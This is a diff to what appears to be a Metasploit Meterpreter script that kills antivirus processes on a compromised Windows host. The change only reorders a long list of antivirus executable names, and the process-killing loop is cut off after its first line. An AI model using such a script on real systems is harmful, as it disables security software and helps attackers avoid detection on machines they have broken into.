@@ -6,10 +6,9 @@
 print_status("Killing Antivirus services on the target...")
 
 avs = %W{
-	avgnt.exe
-	avguard.exe
-	avp.exe 
-	avp.exe 
+	_avp32.exe
+	_avpcc.exe
+	_avpm.exe
 	ackwin32.exe
 	anti-trojan.exe
 	apvxdwin.exe
@@ -17,9 +16,12 @@ avs = %W{
 	avconsol.exe
 	ave32.exe
 	avgctrl.exe
+	avgnt.exe
+	avguard.exe
 	avkserv.exe
 	avnt.exe
 	avp.exe
+	avp.exe 
 	avp32.exe
 	avpcc.exe
 	avpdos32.exe
@@ -115,9 +117,6 @@ avs = %W{
 	webscanx.exe
 	wfindv32.exe
 	zonealarm.exe
-	_avp32.exe
-	_avpcc.exe
-	_avpm.exe
 }
 
 client.sys.process.get_processes().each do |x|
